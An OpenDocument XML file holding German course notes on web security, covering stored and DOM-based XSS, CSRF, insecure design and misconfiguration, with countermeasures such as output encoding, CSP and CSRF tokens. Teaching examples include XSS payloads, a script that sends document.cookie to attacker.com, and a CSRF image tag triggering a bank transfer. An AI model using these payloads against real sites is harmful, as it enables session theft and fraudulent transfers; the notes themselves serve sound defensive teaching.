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54">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P470" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L155">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>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56">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P486" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L157">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58">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P494" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L159">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P495" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L160">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P496" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L161">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P497" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L162">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>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63">
    </style:style>
    <style:style style:name="P508" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
    </style:style>
    <style:style style:name="P509" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L164">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P510" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L165">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P511" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L166">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P512" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L167">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P513" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L168">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P514" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L169">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P515" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L170">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P516" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L171">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P517" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L172">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P518" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L173">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P519" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L174">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P520" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L175">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P521" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L176">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P522" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L177">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P523" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L178">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P524" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L179">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P525" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L180">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P526" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L181">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P527" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L182">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P528" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L183">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P529" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L184">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P530" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L185">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P531" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L186">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P532" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
    </style:style>
    <style:style style:name="P533" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L187">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P534" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
    </style:style>
    <style:style style:name="P535" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L188">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P536" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L189">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P537" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L190">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P538" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L191">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P539" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L192">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P540" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L193">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P541" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L194">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P542" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L195">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P543" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L196">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P544" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L197">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P545" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L198">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P546" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L199">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P547" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L200">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P548" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L201">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P549" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L202">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>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3">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P567" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L204">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P568" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L205">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P569" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L206">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P570" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L207">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P571" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L208">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P572" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L209">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P573" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L210">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P574" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L211">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P575" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L212">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P576" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L213">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P577" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L214">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P578" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L215">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P579" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L216">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P580" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L217">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P581" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L218">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P582" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L219">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P583" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L220">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P584" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L221">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P585" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L222">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P586" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L223">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P587" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L224">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P588" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L225">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P589" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L226">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P590" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L227">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>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228">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Text_20_body" style:list-style-name="L229">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30">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P875" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L231">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P876" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L232">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P877" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L233">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P878" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L234">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P879" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L235">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P880" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L236">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P881" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L237">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P882" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L238">
    </style:style>
    <style:style style:name="P883" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L239">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P884" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L240">
    </style:style>
    <style:style style:name="P885" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L241">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in"/>
    </style:style>
    <style:style style:name="P886"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Befehle in Modulen lokalisiert werd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69">Code wird in einer Datenbank gespeichert und bei jedem Aufruf wieder ausgegeben</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P469">Der Skriptcode wird anschließend unbemerkt im Browser des Anwenders ausgeführt</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="First_20_paragraph">Angriff:</text:p>
      <text:list text:style-name="L155">
        <text:list-item>
          <text:p text:style-name="P470">Gästebuch zeigt Einträge auf Website an</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P470">Schadcode kann über URL oder Formulare eingefügt werden</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P471">http://guestbook.com?entry=Tolle%20Seite!&lt;script&gt;</text:p>
      <text:p text:style-name="P472">alert("XSS")&lt;/script&gt;</text:p>
      <text:p text:style-name="First_20_paragraph">Ergebnis:</text:p>
      <text:p text:style-name="P473">Tolle Seite!&lt;script"&gt;alert("XSS")&lt;/script&gt;</text:p>
      <text:p text:style-name="First_20_paragraph"><text:span text:style-name="T1">Lokales (DOM-basiertes) Cross-Site Scripting</text:span></text:p>
      <text:p text:style-name="Text_20_body">Beispiel:</text:p>
      <text:p text:style-name="P474">&lt;h1&gt;Welcome!&lt;/h1&gt;</text:p>
      <text:p text:style-name="P475">Hi</text:p>
      <text:p text:style-name="P476">&lt;script&gt;</text:p>
      <text:p text:style-name="P477"><text:s text:c="2"/>var pos = document.URL.indexOf("name=") + 5;</text:p>
      <text:p text:style-name="P478"><text:s text:c="2"/>document.write(document.URL.substring(pos, document.URL.length));</text:p>
      <text:p text:style-name="P479">&lt;/script&gt;</text:p>
      <text:p text:style-name="P480">&lt;br /&gt;</text:p>
      <text:p text:style-name="P481">Welcome to our system...</text:p>
      <text:p text:style-name="First_20_paragraph">Normaler Aufruf:</text:p>
      <text:p text:style-name="P482">http://site.com/welcome.html?name=John</text:p>
      <text:p text:style-name="First_20_paragraph">Angriff:</text:p>
      <text:p text:style-name="P483">http://site.com/welcome.html#name=John&lt;script&gt;</text:p>
      <text:p text:style-name="P484">alert("XSS")&lt;/script&gt;</text:p>
      <text:list text:style-name="L156">
        <text:list-item>
          <text:p text:style-name="P485"><text:span text:style-name="Source_Text">#</text:span> zeigt dem Browser an, dass nachfolgende Zeichen ein Fragment sind, d.h. der Parameter wird nicht an den Server übertragen und dort nicht geprüft werden.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P485">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486">Fehlerhafter Servlet-Code</text:p>
          <text:p text:style-name="P487">(String) page += "&lt;input name='creditcard'</text:p>
          <text:p text:style-name="P488">type='TEXT' value='" + request.getParameter("CC") +</text:p>
          <text:p text:style-name="P489">"'&gt;";</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P486">Angriff durch Angabe des folgendes Werts für <text:span text:style-name="Source_Text">CC</text:span>:</text:p>
          <text:p text:style-name="P490">'&gt;&lt;script&gt;document.location='http://www.attacker.com</text:p>
          <text:p text:style-name="P491">/cgi-bin/cookie.cgi?</text:p>
          <text:p text:style-name="P492">foo='+document.cookie&lt;/script&gt;'</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="First_20_paragraph">Ergebnis:</text:p>
      <text:list text:style-name="L158">
        <text:list-item>
          <text:p text:style-name="P493">Angreifer erhält Cookie des Benutzers</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P493">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494">Client- und Server-seitige <text:span text:style-name="T1">Eingabevalidierung</text:span></text:p>
          <text:list text:style-name="L160">
            <text:list-item>
              <text:p text:style-name="P495">Prüfe alle Eingabedaten bevor sie zur Speicherung akzeptiert oder angezeigt werden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P495">Prüfung auf Länge, Typ, Wertebereich, Syntax oder Geschäftsregeln</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P495">Verwende Positivliste bei der Eingabeprüfung “akzeptiere nur als gutartig bekannte Daten”</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P494">Ziehe die <text:span text:style-name="T1">Positivliste</text:span> (white list) immer der Negativliste (black list) vor</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P494"><text:span text:style-name="T1">Ausgabekodierung</text:span></text:p>
          <text:list text:style-name="L161">
            <text:list-item>
              <text:p text:style-name="P496">Stelle sicher, dass alle Benutzereingaben als HTML- oder XML-Entitäten kodiert sind, bevor diese ausgegeben bzw. gerendert werden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P496">Die meisten Frameworks stellen Methoden zur Ausgabekodierung zur Verfügung (php hat <text:span text:style-name="Source_Text">htmlspecialchars()</text:span> oder <text:span text:style-name="Source_Text">htmlentities()</text:span>)</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P494"><text:span text:style-name="T1">Content-Security-Policy</text:span>, teilt dem Browser mit, welche Domains er als Quelle von vertrauenswürdigem JavaScript-Code akzeptieren soll</text:p>
          <text:list text:style-name="L162">
            <text:list-item>
              <text:p text:style-name="P497">Verstöße werden in der Browser-Konsole gemeldet</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P497">Ist CSP aktiv, wird in HTML-Dokumenten eingebetteter JavaScript-Code standardmäßig nicht mehr ausgeführt</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P497">Deaktiviert standardmäßig auch die <text:span text:style-name="Source_Text">eval()</text:span> Funktion von JavaScript</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P497"><text:span text:style-name="Source_Text">Content-Security-Policy: default-src 'self'</text:span> akzeptiert nur vom eigenen Server geladenen Code</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P497">Events wie <text:span text:style-name="Source_Text">onclick</text:span> funktionieren auch nicht mehr</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="First_20_paragraph">Script mit Positivliste gegen lokales XSS</text:p>
      <text:p text:style-name="P498">&lt;script&gt;</text:p>
      <text:p text:style-name="P499"><text:s text:c="4"/>var pos=document.URL.indexOf("name=")+5;</text:p>
      <text:p text:style-name="P500"><text:s text:c="4"/>var name=document.URL.substring(pos, document.URL.length);</text:p>
      <text:p text:style-name="P501"><text:s text:c="4"/>if (name.match(/^[a-zA-Z0-9]$/)) {</text:p>
      <text:p text:style-name="P502"><text:s text:c="8"/>document.write(name);</text:p>
      <text:p text:style-name="P503"><text:s text:c="4"/>} else {</text:p>
      <text:p text:style-name="P504"><text:s text:c="8"/>window.alert("Security error");</text:p>
      <text:p text:style-name="P505"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P506">&lt;/script&gt;</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="cross-site-request-forgery"/>Cross-Site-Request-Forgery<text:bookmark-end text:name="cross-site-request-forgery"/></text:h>
      <text:list text:style-name="L163">
        <text:list-item>
          <text:p text:style-name="P507"><text:span text:style-name="T1">Ersetzen</text:span> in einer <text:span text:style-name="T1">Referenz</text:span> in einem HTML-Dokument durch <text:span text:style-name="T1">Referenz</text:span> auf eine <text:span text:style-name="T1">andere Web-Seite</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P507">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07"><text:span text:style-name="T1">Beispiel</text:span></text:p>
          <text:p text:style-name="P508">&lt;img src="http://www.example.com/transfer.do? frmAcct=document.form.frmAcct&amp;toAcct=4345754&amp; toSWIFTid=434343&amp;amt=3434.43"&gt;</text:p>
          <text:p text:style-name="P507">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09">Generieren von nicht vorhersagbaren Autorisierungstokens, welche nicht automatisch mitgesendet werden</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P509">Anschließend verifizieren, dass die abgeschickten Werte für Name und Wert für den aktuellen Benutzer korrekt sind</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P509">Vor sensiblen Aktionen erneute Authentifizierung einsetzen</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P509"><text:span text:style-name="Source_Text">SameSite</text:span>-Attribut von <text:span text:style-name="Source_Text">Set-Cookie</text:span>. Damit kann eingeschränkt werden, wann Cookies mitgesendet werden</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P509">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10"><text:span text:style-name="T1">Schwachstelle</text:span> im Entwurf</text:p>
          <text:list text:style-name="L166">
            <text:list-item>
              <text:p text:style-name="P511">Einrichten neuer Zugriffsdaten erfolgt über zuvor hinterlegte <text:span text:style-name="T1">Sicherheitsfragen</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P510"><text:span text:style-name="T1">Angriff</text:span></text:p>
          <text:list text:style-name="L167">
            <text:list-item>
              <text:p text:style-name="P512"><text:span text:style-name="T1">Social Engineering</text:span> zum Ausfragen der Person, um die Personen zu erfragen</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P510"><text:span text:style-name="T1">Problem</text:span></text:p>
          <text:list text:style-name="L168">
            <text:list-item>
              <text:p text:style-name="P513">Derartige Fragen und Antworten sind kein vertrauenswürdiger Nachweis für die Identität einer Person</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P510"><text:span text:style-name="T1">Anmerkung</text:span></text:p>
          <text:list text:style-name="L169">
            <text:list-item>
              <text:p text:style-name="P514">Solche Sicherheitsfragen sind durch Standards- und De-Facto-Standards auch verboten</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P510"><text:span text:style-name="T1">Schwachtstelle</text:span> im Entwurf</text:p>
          <text:list text:style-name="L170">
            <text:list-item>
              <text:p text:style-name="P515">Es wurde nicht an Schutz vor Bots gedacht, d.h. die Anzahl an Transaktionen in einem kurzen Zeitraum wurde nicht begrenzt</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P510"><text:span text:style-name="T1">Angriff</text:span></text:p>
          <text:list text:style-name="L171">
            <text:list-item>
              <text:p text:style-name="P516">Bots kaufen und verkaufen für mehr (scalpers)</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P510"><text:span text:style-name="T1">Konsequenzen</text:span></text:p>
          <text:list text:style-name="L172">
            <text:list-item>
              <text:p text:style-name="P517">Rufschädigung</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P517">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18">Anforderungen und Ressourcenverwaltung</text:p>
          <text:list text:style-name="L174">
            <text:list-item>
              <text:p text:style-name="P519">Anforderungen einsammeln und besprechen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P519">Einbeziehen von <text:span text:style-name="T1">Sicherheitsanforderungen</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P519">Berücksichtigen, wie einfach die Anwendung zugreifbar ist</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P519"><text:span text:style-name="T1">Budget</text:span> für alle Phasen <text:span text:style-name="T1">einplanen</text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P518">Sicherer Entwurf</text:p>
          <text:list text:style-name="L175">
            <text:list-item>
              <text:p text:style-name="P520"><text:span text:style-name="T1">Permanente Evaluation</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P520">Integrieren von <text:span text:style-name="T1">Bedrohungsmodellierung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P520">Fehlerzustände in User Stories festlegen</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P518">Sicherer Software-Entwicklungszyklus</text:p>
          <text:list text:style-name="L176">
            <text:list-item>
              <text:p text:style-name="P521">Bedrohungsmodullierung</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P521">Sichere Entwurfsmuster</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P521"><text:span text:style-name="T1">Bibliotheken mit sicheren Komponenten</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P521"><text:span text:style-name="T1">Sicherheitsexperten</text:span> in allen Phasen eingebunden</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P521">Hilfestellung durch OWASP Software Assurance Maturity Model (SAMM)</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P518">Implementierung</text:p>
          <text:list text:style-name="L177">
            <text:list-item>
              <text:p text:style-name="P522">Plausibilitätsprüfungen einbauen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P522"><text:span text:style-name="T1">Unit- und Integrationtests</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P522"><text:span text:style-name="T1">Schichtentrennung</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P522">Mandaten trennen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P522">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23"><text:span text:style-name="T1">Beispiele</text:span></text:p>
          <text:list text:style-name="L179">
            <text:list-item>
              <text:p text:style-name="P524"><text:span text:style-name="T1">Unsauber definierte Berechtigungen</text:span> für Cloud-Services</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P524"><text:span text:style-name="T1">Unnötige Funktionalität</text:span> installiert und/oder aktiviert (Ports/Dienste/Benutzerkonten etc.)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P524"><text:span text:style-name="T1">Standardbenutzerkonten</text:span> und Standardpasswörter</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P524">Detailinformationen (e.g. <text:span text:style-name="T1">Stack Traces</text:span>) in Fehlermeldungen</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P524">System <text:span text:style-name="T1">veraltet</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P524"><text:span text:style-name="T1">Keine sichere Vorbelegung</text:span></text:p>
            </text:list-item>
            <text:list-item>
